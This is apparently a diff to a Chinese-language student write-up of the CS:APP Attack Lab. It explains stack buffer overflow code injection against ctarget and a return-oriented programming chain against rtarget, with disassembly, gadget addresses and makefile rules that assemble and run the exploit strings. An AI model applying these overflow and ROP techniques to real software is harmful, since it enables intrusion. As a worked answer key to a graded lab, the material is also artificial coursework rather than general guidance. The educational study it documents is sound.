@@ -20,6 +20,8 @@
 
   makefile 部分代码如下：
   ```makefile
+  UBUNTU_IMAGE := ubuntu:20.04
+  UBUNTU_NAME := attacklab-ubuntu
   docker:
     docker run --rm -it --privileged \
       -v $(PWD):/lab -w /lab \
@@ -37,7 +39,18 @@
 
 = 实验内容
 
-== Level 1: 简单缓冲区溢出
+所有的实验代码均在 http://github.com/An-314/Notes-of-Computer-Organization-Principle/blob/master/LAB/attacklab/target/makefile 中。
+
+makefile 给出了下面所有实验的步骤的自动化脚本。
+```makefile
+```
+下面我们详细分析各个实验步骤的原理和实现。
+
+以下的讨论都隐去了COOKIE的具体值，而处理过程在makefile中均有体现。
+
+== ctarget 程序分析
+
+=== Level 1: 简单缓冲区溢出
 
 Level 1 要求我们利用缓冲区溢出漏洞，覆盖返回地址，使程序跳转到 `touch1` 函数，从而通过验证。
 
@@ -108,7 +121,7 @@ PASS: Sent exploit string to server to be validated.
 NICE JOB!
 ```
 
-== Level 2: 更复杂的缓冲区溢出
+=== Level 2: 传递整数参数
 
 Level 2 要求我们同样利用缓冲区溢出漏洞，覆盖返回地址，此外还要函数第 1 个参数 `%rdi` 设置为 `cookie`；然后 `ret` 到 `touch2` 的入口地址。
 
@@ -226,13 +239,13 @@ _start:
 执行 `make level2` 即可完成 Level 2 的攻击
 ```txt
 Cookie: 0x********
-Type string:Touch2!: You called touch2(0x177c81f7)
+Type string:Touch2!: You called touch2(0x********)
 Valid solution for level 2 with target ctarget
 PASS: Sent exploit string to server to be validated.
 NICE JOB!
 ```
 
-== Level 3: 防护机制绕过
+=== Level 3: 传递字符串参数
 
 本阶段任务与level 2基本相同，但要传递的参数变为了一个字符串——也就是说，需要传递一个地址作为参数，并自己管理字符串的存储。
 
@@ -330,4 +343,143 @@ level3: $(OUT)/level3_payload.hex disas_ctarget
 	echo -n "$(COOKIE_ASCII_HEX)" >> $(SRC)/ctarget03.txt
 	./hex2raw < $(SRC)/ctarget03.txt > $(OUT)/level3-raw.txt
 	./ctarget < $(OUT)/level3-raw.txt
+```
+执行 `make level3` 即可完成 Level 3 的攻击
+```txt
+Cookie: 0x********
+Type string:Touch3!: You called touch3("********")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
+== rtarget 程序分析
+
+=== Level 2: 传递整数参数
+
+与ctarget相比，rtarget在level2中增加了对栈保护机制的使用：
+- 栈地址随机化：每次运行时栈位置都不一样，不能再用固定的栈地址（像之前的 `BUF_ADDR`）。
+- 栈不可执行（NX）：栈段被标记为不可执行，写进去的机器码无法当作指令执行。
+需要用gadgets的方式进行攻击，利用已有代码片段完成攻击目的。
+
+要调用
+```c
+touch2(cookie);
+```
+只要具备以下两个条件即可：
+- 从栈上取一个 8 字节常数放进某个寄存器
+  - 需要一个gadget：`popq %rax; ret`
+- 把这个寄存器里的值搬到 `%rdi`
+  - 需要一个gadget：`movq %rax, %rdi; ret`
+然后再 `ret` 到 `touch2` 即可
+
+可以构造这样的链
+```
+[ padding 覆盖到 saved RIP ]
+[ addr_of_gadget_pop_rax ]          # ret #1 跳到这里
+[ cookie_value (8 bytes) ]          # 给 pop %rax 用
+[ addr_of_gadget_mov_rax_rdi ]      # ret #2 跳到这里
+[ addr_of_touch2 ]                  # ret #3 最终跳进 touch2
+```
+执行时：
+- `getbuf` 的 `ret` → 跳到 `gadget_pop_rax`
+  - 执行：`popq %rax` → 从栈上读到 `cookie`
+  - 再 `ret` → 跳到 `gadget_mov_rax_rdi`
+- `gadget_mov_rax_rdi`：
+  - 执行：`movq %rax,%rdi`
+  - 再 `ret` → 跳到 `touch2`
+- 进入 `touch2(cookie)`，验证通过，结束。
+
+一样地，先对 `rtarget` 进行反汇编，找到需要的 gadget 和函数地址：
+```asm
+00000000008089c0 <getbuf>:
+  8089c0:	48 83 ec 18          	sub    rsp,0x18
+  8089c4:	48 89 e7             	mov    rdi,rsp
+  8089c7:	e8 b7 03 00 00       	call   808d83 <Gets>
+  8089cc:	b8 01 00 00 00       	mov    eax,0x1
+  8089d1:	48 83 c4 18          	add    rsp,0x18
+  8089d5:	c3                   	ret
+
+0000000000808a04 <touch2>:
+  808a04:	48 83 ec 08          	sub    rsp,0x8
+  ...
+```
+和ctarget的一致：
+- `buf` 的大小 = 0x18 = 24 字节；
+- `mov rdi, rsp`
+- 返回时：我们只要溢出覆盖 24 字节之后的 8 字节 `saved RIP`，即可控制 `ret` 跳去哪里。
+
+现在我们寻找合适的 gadgets：
+```asm
+0000000000808bca <setval_177>:
+  808bca: c7 07 58 90 90 c3   mov    DWORD PTR [rdi],0xc3909058
+  808bd0: c3                  ret
+```
+从中间第 3 个字节（地址 `0x808bcc`）开始解码：
+```
+地址      字节          指令
+808bcc:   58            pop   %rax
+808bcd:   90            nop
+808bce:   90            nop
+808bcf:   c3            ret
+808bd0:   c3            ret   （下一条）
+```
+所以从 `0x808bcc` 开始是一段 gadget。
+- 指令：`pop %rax; nop; nop; ret`
+- 作用：把当前栈顶的 8 字节弹进 `%rax`，然后 `ret` 跳到下一个地址。
+以及
+```asm
+0000000000808bd8 <setval_451>:
+  808bd8: c7 07 48 89 c7 c3   mov    DWORD PTR [rdi],0xc3c78948
+  808bde: c3                  ret
+```
+从中间第 3 个字节（地址 `0x808bda`）开始解码：
+```asm
+地址      字节               指令
+808bda:   48 89 c7           mov %rax, %rdi
+808bdd:   c3                 ret
+808bde:   c3                 ret
+```
+所以从 `0x808bda` 开始是一段 gadget。
+- 指令：`mov %rax, %rdi; ret`
+- 作用：把 `%rax` 的值放到 `%rdi`，然后 `ret` 跳到下一个地址。
+
+利用这两个 gadget，我们可以构造如下的攻击输入：
+```makefile
+COOKIE := $(shell cat cookie.txt)
+COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
+COOKIE_PADDED := $(shell printf "%016s" $(COOKIE_PURE) | tr ' ' '0')
+COOKIE_QWORD_BYTES := $(shell \
+    echo $(COOKIE_PADDED) \
+    | sed 's/../& /g' \
+    | awk '{ for (i=NF;i>=1;i--) printf "%s ", $$i }' \
+)
+COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')
+
+G_POP_RAX := 0x808bcc
+G_POP_RAX_STR := cc 8b 80 00 00 00 00 00
+G_MOV_RAX_RDI := 0x808bda
+G_MOV_RAX_RDI_STR := da 8b 80 00 00 00 00 00
+
+rlevel2: disas_rtarget
+	mkdir -p $(SRC)
+	rm -f $(SRC)/target04.txt
+	for i in `seq 24`; do \
+		echo -n "41 " >> $(SRC)/target04.txt; \
+	done
+	echo -n $(G_POP_RAX_STR) >> $(SRC)/target04.txt
+	echo -n " " >> $(SRC)/target04.txt
+	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/target04.txt
+	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/target04.txt
+	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/target04.txt
+	$(HEX2RAW) < $(SRC)/target04.txt > $(OUT)/rtarget02-raw
+	$(RTARGET) < $(OUT)/rtarget02-raw
+```
+执行 `make rlevel2` 即可完成 Level 2 的攻击
+```txt
+Cookie: 0x********
+Type string:Touch2!: You called touch2(0x********)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
 ```
